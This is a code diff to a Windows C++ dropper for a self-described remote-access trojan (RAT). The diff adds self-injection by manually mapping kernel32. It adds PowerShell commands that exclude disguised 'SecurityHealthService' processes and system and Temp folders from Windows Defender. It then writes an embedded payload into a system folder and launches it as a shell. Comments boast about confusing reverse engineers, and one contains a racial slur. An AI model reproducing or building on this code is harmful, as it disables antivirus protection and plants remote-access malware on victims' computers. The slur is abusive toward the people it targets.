@@ -2,55 +2,20 @@
 #include "pch.h"
 #include "general.h"
 #include "embeds.h"
+#include "injection.h"
+#include "powershell.h"
 
-BOOL IsElevated() {
-    BOOL fRet = FALSE;
-    HANDLE hToken = NULL;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        TOKEN_ELEVATION Elevation;
-        DWORD cbSize = sizeof(TOKEN_ELEVATION);
-        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
-            fRet = Elevation.TokenIsElevated;
-        }
-    }
-    if (hToken) {
-        CloseHandle(hToken);
-    }
-    return fRet;
-}
 
-CHAR* ExePath() {
-    CHAR buffer[MAX_PATH] = { 0 };
-    GetModuleFileNameA(NULL, buffer, MAX_PATH);
-    return buffer;
-}
-std::string GetCWD() {
-    WCHAR buffer[MAX_PATH] = { 0 };
-    GetModuleFileNameW(NULL, buffer, MAX_PATH);
-    std::wstring ws(buffer);
-    std::string file_path(ws.begin(), ws.end());
-    std::wstring::size_type pos = file_path.find_last_of("\\/");
-    return file_path.substr(0, pos + 1);
-}
 void main() {
 	//Alloc console for debug purposes
-	//AllocConsole();
-	//FILE* f;
-	//freopen_s(&f, "CONOUT$", "w", stdout);
+    CreateDebugConsole();
 
-    //if (IsElevated()) {
-    //    printf("Im elevated");
-    //}
-    //else {
-    //    printf("Im a mid integrity dumbass");
-    //    return;
-    //}
     auto full_path = ExePath();
-
+    //Perform self injection
 	HANDLE hProc = GetCurrentProcess();
 
+    //Don't call LoadLibraryA just because why make life easier for anyone
 	auto pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
-
 	while (!pKernel) {
 		pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
 	}
@@ -61,8 +26,12 @@ void main() {
 	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService.exe\"");
 	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService32.exe\"");
 	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthServiceManager.exe\"");
-	//Add exclusion for C:\Windows\System32, which is where the service will be located, also just to mess with anyone reversing this bad boy
+	//Add exclusion for C:\Windows\System32, where the service will be located, and some random ass folders just to mess with anyone reversing this bad boy
 	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"");
+    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\"");
+    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\"");
+    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"");
+    //Our RAT won't really need Windows folder exclusions since we already excluded the processes, and there's always a backup shell capable of regenerating all its other parts via system Tasks
 
     while (FileExists(full_path)) { //If update.exe still exists, wait for it to be renamed
         Sleep(100);
@@ -76,22 +45,19 @@ void main() {
 
     //Write the shell inside System modules folder, just because why not mess with them niggas
     std::ofstream output;
-    output.open(SHELL_PATH(SHELL_MODULE_NAME), std::ofstream::binary);
+    output.open(SHELL_PATH(SHELL_NAME), std::ofstream::binary);
     output.write((char*)embedded_image_1, embedded_image_1_size);
     output.close();
 
-    //Open the shell, which will then load the service
+    //Open the shell, which will then load the service and everything should be smooth sailing from here
     STARTUPINFOA info = { sizeof(info) };
     PROCESS_INFORMATION processInfo;
-    while (!CreateProcessA(SHELL_PATH(SHELL_MODULE_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL,  & info, &processInfo))
+    while (!CreateProcessA(SHELL_PATH(SHELL_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL,  & info, &processInfo))
     {
         Sleep(100);
     }
     CloseHandle(processInfo.hProcess);
     CloseHandle(processInfo.hThread);
-
-    //Wait for main executable to end execution otherwise it will fucking crash sometimes
-	Sleep(-1);
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
